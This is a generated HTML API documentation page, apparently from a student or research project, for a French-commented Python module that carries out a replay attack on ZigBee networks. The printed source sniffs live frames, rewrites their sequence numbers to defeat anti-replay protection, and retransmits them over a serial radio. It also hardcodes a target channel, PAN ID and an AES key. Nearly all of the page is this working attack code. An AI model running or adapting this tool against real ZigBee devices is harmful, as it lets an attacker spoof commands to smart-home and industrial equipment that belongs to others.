@@ -1,0 +1,585 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+<meta name="generator" content="pdoc3 0.11.5">
+<title>scripts.replay API documentation</title>
+<meta name="description" content="Ce Module implémente une attaque de replay sur le réseau ZigBee. Il permet de capturer des trames ZigBee, de les analyser, de les modifier et de les …">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/sanitize.min.css" integrity="sha512-y1dtMcuvtTMJc1yPgEqF0ZjQbhnc/bFhyvIyVNb9Zk5mIGtqVaAB1Ttl28su8AvFMOY0EwRbAe+HCLqj6W7/KA==" crossorigin>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/typography.min.css" integrity="sha512-Y1DYSb995BAfxobCkKepB1BqJJTPrOp3zPL74AWFugHHmmdcvO+C48WLrUOlhGMc0QG7AE3f7gmvvcrmX2fDoA==" crossorigin>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css" crossorigin>
+<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:1.5em;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:2em 0 .50em 0}h3{font-size:1.4em;margin:1.6em 0 .7em 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .2s ease-in-out}a:visited{color:#503}a:hover{color:#b62}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900;font-weight:bold}pre code{font-size:.8em;line-height:1.4em;padding:1em;display:block}code{background:#f3f3f3;font-family:"DejaVu Sans Mono",monospace;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source > summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible;min-width:max-content}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em 1em;margin:1em 0}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
+<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul ul{padding-left:1em}.toc > ul > li{margin-top:.5em}}</style>
+<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" integrity="sha512-D9gUyxqja7hBtkWpPWGt9wfbfaMGVt9gnyCvYa+jojwwPHLCzUm5i8rpk7vD7wNee9bA35eYIjobYPaQuKS1MQ==" crossorigin></script>
+<script>window.addEventListener('DOMContentLoaded', () => {
+hljs.configure({languages: ['bash', 'css', 'diff', 'graphql', 'ini', 'javascript', 'json', 'plaintext', 'python', 'python-repl', 'rust', 'shell', 'sql', 'typescript', 'xml', 'yaml']});
+hljs.highlightAll();
+/* Collapse source docstrings */
+setTimeout(() => {
+[...document.querySelectorAll('.hljs.language-python > .hljs-string')]
+.filter(el => el.innerHTML.length > 200 && ['"""', "'''"].includes(el.innerHTML.substring(0, 3)))
+.forEach(el => {
+let d = document.createElement('details');
+d.classList.add('hljs-string');
+d.innerHTML = '<summary>"""</summary>' + el.innerHTML.substring(3);
+el.replaceWith(d);
+});
+}, 100);
+})</script>
+</head>
+<body>
+<main>
+<article id="content">
+<header>
+<h1 class="title">Module <code>scripts.replay</code></h1>
+</header>
+<section id="section-intro">
+<p>Ce Module implémente une attaque de replay sur le réseau ZigBee. Il permet de capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer sur le réseau ZigBee. Il gère également les mécanismes de protection contre les attaques de type replay et permet de personnaliser la configuration de l' attaque.</p>
+</section>
+<section>
+</section>
+<section>
+</section>
+<section>
+<h2 class="section-title" id="header-functions">Functions</h2>
+<dl>
+<dt id="scripts.replay.main"><code class="name flex">
+<span>def <span class="ident">main</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def main():
+    &#34;&#34;&#34;
+    @brief Fonction principale pour configurer et lancer l&#39;attaque de replay ZigBee.
+    &#34;&#34;&#34;
+    # Configuration de l&#39;attaque
+    attaque = ZigbeeReplayAttack(
+        capture_file=&#39;captures_zigbee.json&#39;,
+        channel=13,
+        pan_id=0x1900,
+        serial_port=&#39;/dev/ttyACM0&#39;,
+        aes_key=&#34;9b9494920170aeed67e90ce7d672face&#34;
+    )
+    
+    # Lancer l&#39;attaque avec capture live
+    attaque.lancer_attaque_replay(
+        nombre_replays=3,
+        capture_live=True
+    )</code></pre>
+</details>
+<div class="desc"><p>@brief Fonction principale pour configurer et lancer l'attaque de replay ZigBee.</p></div>
+</dd>
+</dl>
+</section>
+<section>
+<h2 class="section-title" id="header-classes">Classes</h2>
+<dl>
+<dt id="scripts.replay.ZigbeeReplayAttack"><code class="flex name class">
+<span>class <span class="ident">ZigbeeReplayAttack</span></span>
+<span>(</span><span>capture_file: str = 'captures_zigbee.json',<br>channel: int = 13,<br>pan_id: int = 6400,<br>serial_port: str | None = None,<br>aes_key: str | None = None)</span>
+</code></dt>
+<dd>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">class ZigbeeReplayAttack:
+    &#34;&#34;&#34;
+    @class ZigbeeReplayAttack
+    @brief Classe pour effectuer une attaque de replay sur le réseau ZigBee.
+    @details Cette classe permet de capturer des trames ZigBee, de les analyser, de les modifier (par exemple, en modifiant
+             les numéros de séquence) et de les rejouer sur le réseau ZigBee. Elle gère également les mécanismes de 
+             protection contre les attaques de type replay et permet de personnaliser la configuration de l&#39;attaque.
+    &#34;&#34;&#34;
+
+    def __init__(
+        self, 
+        capture_file: str = &#39;captures_zigbee.json&#39;, 
+        channel: int = 13, 
+        pan_id: int = 0x1900,
+        serial_port: Optional[str] = None,
+        aes_key: Optional[str] = None
+    ):
+        &#34;&#34;&#34;
+        @brief Constructeur de la classe ZigbeeReplayAttack.
+        
+        @param capture_file: Nom du fichier de capture pour stocker les trames ZigBee capturées.
+        @param channel: Canal ZigBee sur lequel l&#39;attaque de replay sera effectuée.
+        @param pan_id: PAN ID du réseau ZigBee.
+        @param serial_port: Port série utilisé pour envoyer les trames de replay.
+        @param aes_key: Clé AES pour la sécurité des trames, si applicable.
+        &#34;&#34;&#34;
+        self.capture_file = capture_file
+        self.channel = channel
+        self.pan_id = pan_id
+        self.serial_port = serial_port
+        self.aes_key = aes_key
+        
+        # Initialisation des classes auxiliaires
+        self.codeur = CodeurTrameZigbee(logger)
+        self.decodeur = DecodeurTrameZigbee(logger)
+        self.sniffer = SniffeurZigbee(
+            canal=channel,
+            fichier_sortie=capture_file,
+            vitesse_bauds=115200
+        )
+        
+        # Gestion des séquences et anti-replay
+        self.sequence_base = None
+        self.sequence_offset = 0
+        self.captures = []
+        self.replay_queue = queue.Queue()
+        self.sequence_variations = []
+
+    def capturer_trames_live(self, duree_capture: int = 10):
+        &#34;&#34;&#34;
+        @brief Capture live des trames ZigBee pendant une durée spécifiée.
+        
+        @param duree_capture: Durée de la capture en secondes.
+        &#34;&#34;&#34;
+        logger.info(f&#34;Démarrage de la capture live pour {duree_capture} secondes&#34;)
+        self.sniffer.demarrer_sniffer()
+        time.sleep(duree_capture)
+        self.sniffer.arreter_sniffer()
+        self.sniffer.sauvegarder_captures()
+        self.captures = self.sniffer.captures
+        logger.info(f&#34;Capture terminée : {len(self.captures)} trames capturées&#34;)
+
+    def charger_captures(self):
+        &#34;&#34;&#34;
+        @brief Charger et analyser les captures ZigBee à partir d&#39;un fichier JSON.
+        &#34;&#34;&#34;
+        try:
+            with open(self.capture_file, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
+                raw_captures = json.load(f)
+                
+            # Décoder chaque trame capturée
+            self.captures = []
+            for capture in raw_captures:
+                if isinstance(capture, str):  # Si c&#39;est une chaîne hex
+                    trame_bytes = bytes.fromhex(capture)
+                    trame_decodee = self.decodeur.decoder_trame_zigbee(trame_bytes)
+                    if trame_decodee:
+                        self.captures.append(trame_decodee)
+                else:  # Si c&#39;est déjà un dictionnaire décodé
+                    self.captures.append(capture)
+            
+            # Extraire les séquences
+            self._extraire_sequences()
+            logger.info(f&#34;Chargement réussi : {len(self.captures)} trames&#34;)
+            
+        except Exception as e:
+            logger.error(f&#34;Erreur lors du chargement des captures : {e}&#34;)
+            self.captures = []
+
+    def _extraire_sequences(self):
+        &#34;&#34;&#34;
+        @brief Extraire les numéros de séquence des trames capturées.
+        &#34;&#34;&#34;
+        sequences = []
+        for capture in self.captures:
+            if capture[&#39;type_trame&#39;] == &#39;Data&#39;:
+                seq = capture[&#39;couche_mac&#39;].get(&#39;numero_sequence&#39;)
+                if seq is not None:
+                    sequences.append(seq)
+            elif &#39;sequence_number&#39; in capture:
+                sequences.append(capture[&#39;sequence_number&#39;])
+                
+        if sequences:
+            self.sequence_base = min(sequences)
+            self._generer_variations_sequence()
+
+    def _generer_variations_sequence(self):
+        &#34;&#34;&#34;
+        @brief Générer des variations de numéro de séquence basées sur la séquence de base.
+        &#34;&#34;&#34;
+        if not self.sequence_base:
+            return
+        
+        variations = [
+            self.sequence_base,
+            (self.sequence_base + 1) % 256,
+            (self.sequence_base + random.randint(2, 10)) % 256,
+            self._generer_sequence_cryptographique()
+        ]
+        
+        self.sequence_variations = variations
+        logger.debug(f&#34;Variations de séquence générées : {self.sequence_variations}&#34;)
+
+    def _generer_sequence_cryptographique(self) -&gt; int:
+        &#34;&#34;&#34;
+        @brief Générer un numéro de séquence cryptographiquement sûr.
+        
+        @return: Numéro de séquence généré de manière cryptographique.
+        &#34;&#34;&#34;
+        seed = hashlib.sha256(
+            str(self.sequence_base).encode() + 
+            str(time.time()).encode()
+        ).digest()
+        return int.from_bytes(seed[:1], byteorder=&#39;big&#39;)
+
+    def preparer_trame_replay(self, trame_originale: dict) -&gt; bytes:
+        &#34;&#34;&#34;
+        @brief Préparer une trame pour le replay en modifiant le numéro de séquence.
+        
+        @param trame_originale: Trame ZigBee originale à modifier.
+        
+        @return: Trame prête à être envoyée en replay sous forme de bytes.
+        &#34;&#34;&#34;
+        sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
+        
+        # Modifier la séquence dans la trame
+        if trame_originale[&#39;type_trame&#39;] == &#39;Data&#39;:
+            trame_originale[&#39;couche_mac&#39;][&#39;numero_sequence&#39;] = sequence
+            trame_originale[&#39;couche_reseau&#39;][&#39;sequence_number&#39;] = sequence
+        else:
+            trame_originale[&#39;sequence_number&#39;] = sequence
+            
+        # Encoder la trame modifiée
+        return self.codeur.encoder_trame_zigbee(trame_originale)
+
+    def preparer_trames_replay(self, nombre_trames: int = 20):
+        &#34;&#34;&#34;
+        @brief Préparer plusieurs trames pour le replay.
+        
+        @param nombre_trames: Nombre de trames à préparer pour le replay.
+        &#34;&#34;&#34;
+        self.replay_queue = queue.Queue()
+        
+        for _ in range(nombre_trames):
+            if not self.captures:
+                continue
+
+            trame_originale = random.choice(self.captures)
+            trame_modifiee = self.preparer_trame_replay(trame_originale)
+            self.replay_queue.put(trame_modifiee)
+
+    def envoyer_trames_replay(self, nombre_replays: int = 5):
+        &#34;&#34;&#34;
+        @brief Envoyer les trames de replay via le port série.
+        
+        @param nombre_replays: Nombre de fois que chaque trame sera envoyée.
+        &#34;&#34;&#34;
+        try:
+            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
+                logger.info(f&#34;Début du replay via {self.serial_port}&#34;)
+                
+                while not self.replay_queue.empty():
+                    trame = self.replay_queue.get()
+                    
+                    for _ in range(nombre_replays):
+                        # Construction de la trame complète avec en-tête
+                        trame_complete = bytearray([
+                            len(trame) + 3,  # Longueur
+                            self.channel,    # Canal
+                            self.pan_id &gt;&gt; 8,  # PAN ID (octet haut)
+                            self.pan_id &amp; 0xFF  # PAN ID (octet bas)
+                        ])
+                        trame_complete.extend(trame)
+                        
+                        # Envoi avec délai aléatoire
+                        ser.write(trame_complete)
+                        time.sleep(random.uniform(0.1, 0.5))
+                        
+                        logger.debug(f&#34;Trame replay envoyée - Longueur: {len(trame_complete)}&#34;)
+                        
+        except Exception as e:
+            logger.error(f&#34;Erreur durant le replay : {e}&#34;)
+
+    def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
+        &#34;&#34;&#34;
+        @brief Lancer l&#39;attaque de replay complète avec capture et envoi des trames.
+        
+        @param nombre_replays: Nombre de fois que chaque trame sera envoyée.
+        @param capture_live: Si True, effectuer une capture live des trames ZigBee.
+        &#34;&#34;&#34;
+        try:
+            if capture_live:
+                self.capturer_trames_live()
+            else:
+                self.charger_captures()
+                
+            if not self.captures:
+                logger.error(&#34;Aucune trame à rejouer&#34;)
+                return
+                
+            self.preparer_trames_replay()
+            
+            # Lancement du replay dans un thread séparé
+            thread_replay = threading.Thread(
+                target=self.envoyer_trames_replay, 
+                kwargs={&#39;nombre_replays&#39;: nombre_replays}
+            )
+            thread_replay.start()
+            thread_replay.join()
+            
+        except Exception as e:
+            logger.error(f&#34;Échec de l&#39;attaque de replay : {e}&#34;)</code></pre>
+</details>
+<div class="desc"><p>@class ZigbeeReplayAttack
+@brief Classe pour effectuer une attaque de replay sur le réseau ZigBee.
+@details Cette classe permet de capturer des trames ZigBee, de les analyser, de les modifier (par exemple, en modifiant
+les numéros de séquence) et de les rejouer sur le réseau ZigBee. Elle gère également les mécanismes de
+protection contre les attaques de type replay et permet de personnaliser la configuration de l'attaque.</p>
+<p>@brief Constructeur de la classe ZigbeeReplayAttack.</p>
+<p>@param capture_file: Nom du fichier de capture pour stocker les trames ZigBee capturées.
+@param channel: Canal ZigBee sur lequel l'attaque de replay sera effectuée.
+@param pan_id: PAN ID du réseau ZigBee.
+@param serial_port: Port série utilisé pour envoyer les trames de replay.
+@param aes_key: Clé AES pour la sécurité des trames, si applicable.</p></div>
+<h3>Methods</h3>
+<dl>
+<dt id="scripts.replay.ZigbeeReplayAttack.capturer_trames_live"><code class="name flex">
+<span>def <span class="ident">capturer_trames_live</span></span>(<span>self, duree_capture: int = 10)</span>
+</code></dt>
+<dd>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def capturer_trames_live(self, duree_capture: int = 10):
+    &#34;&#34;&#34;
+    @brief Capture live des trames ZigBee pendant une durée spécifiée.
+    
+    @param duree_capture: Durée de la capture en secondes.
+    &#34;&#34;&#34;
+    logger.info(f&#34;Démarrage de la capture live pour {duree_capture} secondes&#34;)
+    self.sniffer.demarrer_sniffer()
+    time.sleep(duree_capture)
+    self.sniffer.arreter_sniffer()
+    self.sniffer.sauvegarder_captures()
+    self.captures = self.sniffer.captures
+    logger.info(f&#34;Capture terminée : {len(self.captures)} trames capturées&#34;)</code></pre>
+</details>
+<div class="desc"><p>@brief Capture live des trames ZigBee pendant une durée spécifiée.</p>
+<p>@param duree_capture: Durée de la capture en secondes.</p></div>
+</dd>
+<dt id="scripts.replay.ZigbeeReplayAttack.charger_captures"><code class="name flex">
+<span>def <span class="ident">charger_captures</span></span>(<span>self)</span>
+</code></dt>
+<dd>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def charger_captures(self):
+    &#34;&#34;&#34;
+    @brief Charger et analyser les captures ZigBee à partir d&#39;un fichier JSON.
+    &#34;&#34;&#34;
+    try:
+        with open(self.capture_file, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f:
+            raw_captures = json.load(f)
+            
+        # Décoder chaque trame capturée
+        self.captures = []
+        for capture in raw_captures:
+            if isinstance(capture, str):  # Si c&#39;est une chaîne hex
+                trame_bytes = bytes.fromhex(capture)
+                trame_decodee = self.decodeur.decoder_trame_zigbee(trame_bytes)
+                if trame_decodee:
+                    self.captures.append(trame_decodee)
+            else:  # Si c&#39;est déjà un dictionnaire décodé
+                self.captures.append(capture)
+        
+        # Extraire les séquences
+        self._extraire_sequences()
+        logger.info(f&#34;Chargement réussi : {len(self.captures)} trames&#34;)
+        
+    except Exception as e:
+        logger.error(f&#34;Erreur lors du chargement des captures : {e}&#34;)
+        self.captures = []</code></pre>
+</details>
+<div class="desc"><p>@brief Charger et analyser les captures ZigBee à partir d'un fichier JSON.</p></div>
+</dd>
+<dt id="scripts.replay.ZigbeeReplayAttack.envoyer_trames_replay"><code class="name flex">
+<span>def <span class="ident">envoyer_trames_replay</span></span>(<span>self, nombre_replays: int = 5)</span>
+</code></dt>
+<dd>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def envoyer_trames_replay(self, nombre_replays: int = 5):
+    &#34;&#34;&#34;
+    @brief Envoyer les trames de replay via le port série.
+    
+    @param nombre_replays: Nombre de fois que chaque trame sera envoyée.
+    &#34;&#34;&#34;
+    try:
+        with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
+            logger.info(f&#34;Début du replay via {self.serial_port}&#34;)
+            
+            while not self.replay_queue.empty():
+                trame = self.replay_queue.get()
+                
+                for _ in range(nombre_replays):
+                    # Construction de la trame complète avec en-tête
+                    trame_complete = bytearray([
+                        len(trame) + 3,  # Longueur
+                        self.channel,    # Canal
+                        self.pan_id &gt;&gt; 8,  # PAN ID (octet haut)
+                        self.pan_id &amp; 0xFF  # PAN ID (octet bas)
+                    ])
+                    trame_complete.extend(trame)
+                    
+                    # Envoi avec délai aléatoire
+                    ser.write(trame_complete)
+                    time.sleep(random.uniform(0.1, 0.5))
+                    
+                    logger.debug(f&#34;Trame replay envoyée - Longueur: {len(trame_complete)}&#34;)
+                    
+    except Exception as e:
+        logger.error(f&#34;Erreur durant le replay : {e}&#34;)</code></pre>
+</details>
+<div class="desc"><p>@brief Envoyer les trames de replay via le port série.</p>
+<p>@param nombre_replays: Nombre de fois que chaque trame sera envoyée.</p></div>
+</dd>
+<dt id="scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay"><code class="name flex">
+<span>def <span class="ident">lancer_attaque_replay</span></span>(<span>self, nombre_replays: int = 5, capture_live: bool = False)</span>
+</code></dt>
+<dd>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
+    &#34;&#34;&#34;
+    @brief Lancer l&#39;attaque de replay complète avec capture et envoi des trames.
+    
+    @param nombre_replays: Nombre de fois que chaque trame sera envoyée.
+    @param capture_live: Si True, effectuer une capture live des trames ZigBee.
+    &#34;&#34;&#34;
+    try:
+        if capture_live:
+            self.capturer_trames_live()
+        else:
+            self.charger_captures()
+            
+        if not self.captures:
+            logger.error(&#34;Aucune trame à rejouer&#34;)
+            return
+            
+        self.preparer_trames_replay()
+        
+        # Lancement du replay dans un thread séparé
+        thread_replay = threading.Thread(
+            target=self.envoyer_trames_replay, 
+            kwargs={&#39;nombre_replays&#39;: nombre_replays}
+        )
+        thread_replay.start()
+        thread_replay.join()
+        
+    except Exception as e:
+        logger.error(f&#34;Échec de l&#39;attaque de replay : {e}&#34;)</code></pre>
+</details>
+<div class="desc"><p>@brief Lancer l'attaque de replay complète avec capture et envoi des trames.</p>
+<p>@param nombre_replays: Nombre de fois que chaque trame sera envoyée.
+@param capture_live: Si True, effectuer une capture live des trames ZigBee.</p></div>
+</dd>
+<dt id="scripts.replay.ZigbeeReplayAttack.preparer_trame_replay"><code class="name flex">
+<span>def <span class="ident">preparer_trame_replay</span></span>(<span>self, trame_originale: dict) ‑> bytes</span>
+</code></dt>
+<dd>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def preparer_trame_replay(self, trame_originale: dict) -&gt; bytes:
+    &#34;&#34;&#34;
+    @brief Préparer une trame pour le replay en modifiant le numéro de séquence.
+    
+    @param trame_originale: Trame ZigBee originale à modifier.
+    
+    @return: Trame prête à être envoyée en replay sous forme de bytes.
+    &#34;&#34;&#34;
+    sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
+    
+    # Modifier la séquence dans la trame
+    if trame_originale[&#39;type_trame&#39;] == &#39;Data&#39;:
+        trame_originale[&#39;couche_mac&#39;][&#39;numero_sequence&#39;] = sequence
+        trame_originale[&#39;couche_reseau&#39;][&#39;sequence_number&#39;] = sequence
+    else:
+        trame_originale[&#39;sequence_number&#39;] = sequence
+        
+    # Encoder la trame modifiée
+    return self.codeur.encoder_trame_zigbee(trame_originale)</code></pre>
+</details>
+<div class="desc"><p>@brief Préparer une trame pour le replay en modifiant le numéro de séquence.</p>
+<p>@param trame_originale: Trame ZigBee originale à modifier.</p>
+<p>@return: Trame prête à être envoyée en replay sous forme de bytes.</p></div>
+</dd>
+<dt id="scripts.replay.ZigbeeReplayAttack.preparer_trames_replay"><code class="name flex">
+<span>def <span class="ident">preparer_trames_replay</span></span>(<span>self, nombre_trames: int = 20)</span>
+</code></dt>
+<dd>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def preparer_trames_replay(self, nombre_trames: int = 20):
+    &#34;&#34;&#34;
+    @brief Préparer plusieurs trames pour le replay.
+    
+    @param nombre_trames: Nombre de trames à préparer pour le replay.
+    &#34;&#34;&#34;
+    self.replay_queue = queue.Queue()
+    
+    for _ in range(nombre_trames):
+        if not self.captures:
+            continue
+
+        trame_originale = random.choice(self.captures)
+        trame_modifiee = self.preparer_trame_replay(trame_originale)
+        self.replay_queue.put(trame_modifiee)</code></pre>
+</details>
+<div class="desc"><p>@brief Préparer plusieurs trames pour le replay.</p>
+<p>@param nombre_trames: Nombre de trames à préparer pour le replay.</p></div>
+</dd>
+</dl>
+</dd>
+</dl>
+</section>
+</article>
+<nav id="sidebar">
+<div class="toc">
+<ul></ul>
+</div>
+<ul id="index">
+<li><h3>Super-module</h3>
+<ul>
+<li><code><a title="scripts" href="index.html">scripts</a></code></li>
+</ul>
+</li>
+<li><h3><a href="#header-functions">Functions</a></h3>
+<ul class="">
+<li><code><a title="scripts.replay.main" href="#scripts.replay.main">main</a></code></li>
+</ul>
+</li>
+<li><h3><a href="#header-classes">Classes</a></h3>
+<ul>
+<li>
+<h4><code><a title="scripts.replay.ZigbeeReplayAttack" href="#scripts.replay.ZigbeeReplayAttack">ZigbeeReplayAttack</a></code></h4>
+<ul class="">
+<li><code><a title="scripts.replay.ZigbeeReplayAttack.capturer_trames_live" href="#scripts.replay.ZigbeeReplayAttack.capturer_trames_live">capturer_trames_live</a></code></li>
+<li><code><a title="scripts.replay.ZigbeeReplayAttack.charger_captures" href="#scripts.replay.ZigbeeReplayAttack.charger_captures">charger_captures</a></code></li>
+<li><code><a title="scripts.replay.ZigbeeReplayAttack.envoyer_trames_replay" href="#scripts.replay.ZigbeeReplayAttack.envoyer_trames_replay">envoyer_trames_replay</a></code></li>
+<li><code><a title="scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay" href="#scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay">lancer_attaque_replay</a></code></li>
+<li><code><a title="scripts.replay.ZigbeeReplayAttack.preparer_trame_replay" href="#scripts.replay.ZigbeeReplayAttack.preparer_trame_replay">preparer_trame_replay</a></code></li>
+<li><code><a title="scripts.replay.ZigbeeReplayAttack.preparer_trames_replay" href="#scripts.replay.ZigbeeReplayAttack.preparer_trames_replay">preparer_trames_replay</a></code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</nav>
+</main>
+<footer id="footer">
+<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.11.5</a>.</p>
+</footer>
+</body>
+</html>
